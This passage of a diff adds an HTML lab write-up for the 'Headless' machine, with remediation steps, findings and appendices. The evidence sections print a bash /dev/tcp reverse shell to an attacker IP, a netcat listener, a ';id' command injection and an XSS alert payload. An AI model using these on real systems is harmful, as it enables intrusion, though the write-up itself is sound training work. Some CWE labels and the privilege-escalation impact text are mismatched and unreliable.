+                                <ul>
+                                    <li>Adopt a secure development policy that involves using restricted access functions and using more secure libraries or APIs that limit the execution of arbitrary commands.</li>
+                                    <li>If not needed, disable dangerous PHP functions like `<strong>exec()</strong>`, `<strong>system()</strong>`, `<strong>shell_exec()</strong>`, and `<strong>passthru()</strong>` on the server.</li>
+                                </ul>
+                                <li><strong>Privilege Escalation <span style="color: rgb(78, 211, 78);">[Finding 1]</span></strong></li>
+                                <ul>
+                                    <li>Audit all files and scripts on the system to ensure that there are no other programs with elevated privileges that can be misused. Ensure that `<strong>sudo</strong>` settings and file permissions are correctly defined.</li>
+                                    <li>Limit access to executable files and scripts with root privileges to strictly necessary users.</li>
+                                </ul>
+                            </ul>                            
+                        </div>
+                        <div id="Long-Term">
+                            <h2>5.3 Long Term</h2>
+                            <ul>
+                                <li><strong>XSS (Cross-Site Scripting) <span style="color: rgb(78, 211, 78);">[Finding 3]</span></strong></li>
+                                <ul>
+                                    <li>Ensure that all development teams implement security best practices throughout the software lifecycle (SDLC), with an emphasis on XSS prevention.</li>
+                                    <li>Provide regular security training to developers and system administrators on the latest vulnerabilities and mitigation practices.</li>
+                                </ul>
+                                <li><strong>Arbitrary Command Injection <span style="color: rgb(78, 211, 78);">[Finding 2]</span></strong></li>
+                                <ul>
+                                    <li>Adopt a more robust architecture to prevent unnecessary exposure of critical functions through web interfaces. Set strict limits on interactions between the server and executable scripts.</li>
+                                    <li>Integrate penetration testing and static code analysis tools within the development process to detect command injection vulnerabilities in an automated manner.</li>
+                                </ul>
+                                <li><strong>Privilege Escalation <span style="color: rgb(78, 211, 78);">[Finding 1]</span></strong></li>
+                                <ul>
+                                    <li>Adopt a least-privilege policy, ensuring that users only have the permissions strictly necessary to perform their tasks.</li>
+                                    <li>Implement security monitoring solutions that can detect and alert on possible attempts at privilege escalation or permission abuse.</li>
+                                </ul>
+                            </ul>
+                        </div>
+                    </div>
+                    <div id="Technical-Findings-Details">
+                        <h1>6. Technical Findings Details</h1>
+                        <h3>Privilege Escalation<span style="color: red"></span></h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-red">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/275.html" target="_blank">CWE-264</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-red">CVSS</td>
+                                    <td id="column-2-2">8.8</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Description</td>
+                                    <td id="column-2-1">A normal user can run a script with root privileges due to incorrect configuration.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Security Impact</td>
+                                    <td id="column-2-2">Exploiting this vulnerability allows malicious scripts to be executed in the user's browser, compromising their session.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Remedation</td>
+                                    <td id="column-2-1">Properly filter and validate input data in the admin panel. Implement an “Escape” approach for dangerous characters.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <p>We move to the <i>/tmp</i> directory, create the `<strong>initdb.sh</strong>` file with a reverse shell inside: `<strong>bash -i >& /dev/tcp/10.10.14.42/1234 0>&1</strong>` and give execution permissions.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/24.png" alt="">
+                        </div>
+                        <p>We listen on port 1234 on our attacker machine.</p>
+                        <div class="console-code">
+                            <pre>
+$ nc -nvlp 1234
+listening in [any] 1234 ...
+                            </pre>
+                        </div>
+                        <p>We run the script with the command `<strong>sudo /usr/bin/syscheck</strong>`</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/25.png" alt="">
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/26.png" alt="">
+                        </div>
+                        
+                        <h3>Arbitrary Command Injection<span style="color:red">High</span> </h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-red">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/255.html" target="_blank">CWE-255</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-red">CVSS</td>
+                                    <td id="column-2-2">7.5</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Description</td>
+                                    <td id="column-2-1">The admin panel allows executing arbitrary commands via an injection vulnerability.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Security Impact</td>
+                                    <td id="column-2-2">Attackers can execute arbitrary system commands, which can compromise the server and its data.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Remedation</td>
+                                    <td id="column-2-1">Validate input to prevent commands from being injected into requests. Restrict command execution permissions from the dashboard.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <p>We test with `<strong>;id</strong>`, send the request, see our reflected command and confirm that it is vulnerable to command injection.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/19.png" alt="">
+                        </div>
+
+                        <h3>Cross-Site Scripting (XSS) <span style="color:orange">Medium</span></h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-orange">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/79.html" target="_blank">CWE-22</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-orange">CVSS</td>
+                                    <td id="column-2-2">6.1</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Description</td>
+                                    <td id="column-2-1">The admin panel allows injection of malicious scripts into input fields.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Security Impact</td>
+                                    <td id="column-2-2">Exploiting this vulnerability allows malicious scripts to be executed in the user's browser, compromising their session.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Remedation</td>
+                                    <td id="column-2-1">Properly filter and validate input data in the admin panel. Implement an "<strong>Escape</strong>" approach for dangerous characters.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <p>From here, we can try to inject Javascript code into the <strong>User-Agent</strong> header of the request: <strong>&ltscript>alert('Hello!')&lt/script></strong>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/7.png" alt="">
+                        </div>
+                        <p>We send the request, the payload works, and we confirm that the website is vulnerable to <strong>XSS</strong>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/8.png" alt="">
+                        </div>
+                    </div>                   
+                   
+                    <div id="Conclusion">
+                        <h1>7. Conclusion</h1>
+                        <p>In summary, the vulnerability analysis carried out reveals three critical flaws in the system: XSS, arbitrary command injection, and a misconfiguration that allows privilege escalation to root level. These vulnerabilities expose the system to significant risk, as an attacker could take full control of the system and perform malicious actions remotely. However, by implementing the proposed solutions in the short, medium, and long term, it is possible to mitigate these risks and strengthen the security of the system.</p>
+                        <p>The remediation process should be ongoing, with constant updating of secure development practices and periodic audits to ensure that new vulnerabilities are not introduced. By implementing technical controls and educating developers and administrators on security best practices, the attack surface can be minimized and the security posture of the system strengthened in the long term.</p>
+                    </div>
+                    
+                    <div id="Appendices">
+                        <h1> 8. Appendices</h1>
+                        <h3>Appendix A - Finding Severities</h3>
+                        <p>Each finding has been assigned a severity rating of high, medium, or low. The rating is based off of an assessment of the priority with which each finding should be viewed and the potential impact each has on the confidentiality, integrity, and availability of Headless's data.</p>
+                        <table id="Appendices-table">
+                            <thead>
+                                <tr>
+                                    <th style="margin: center;">Rating</th>
+                                    <th style="text-align: left;">Severity Rating Definition</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f1">High</td>
+                                    <td id="c2-f1">Exploitation of the technical or procedural vulnerability will cause substantial harm. Significant political, financial, and/or legal damage is likely to result. The threat exposure is high, thereby increasing the likelihood of occurrence. Security controls are not effectively implemented to reduce the severity of impact if the vulnerability were exploited.</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f2">Medium</td>
+                                    <td id="c2-f2">Exploitation of the technical or procedural vulnerability will significantly impact the confidentiality, integrity, and/or availability of the system, application, or data. Exploitation of the vulnerability may cause moderate financial loss or public embarrassment. The threat exposure is moderate-to-high, thereby increasing the likelihood of occurrence. Security controls are in place to contain the severity of impact if the vulnerability were exploited, such that further political, financial, or legal damage will not occur.</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f3">Low</td>
+                                    <td id="c2-f3">Exploitation of the technical or procedural vulnerability will cause minimal impact to operations. The Confidentiality, Integrity and Availability (CIA) of sensitive information are not at risk of compromise. Exploitation of the vulnerability may cause slight financial loss or public embarrassment. The threat exposure is moderate-to-low. Security controls are in place to contain the severity of impact if the vulnerability were exploited, such that further political, financial, or legal damage will not occur. </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 4: Severity Definitions</p>
+                        
+                    </div>
+                    <!--Final-->
+                </section>
+            </div>
+
+        </div>
+    </div>
+    
+    <!--Pet Cat-->
+    <div class="pet-container">
+        <img src="" alt="Walking Pet" id="pet" class="pet">
+    </div>
+    <script src="script.js"></script>
+    <!--Pet Cat-->
+</body>
+</html>
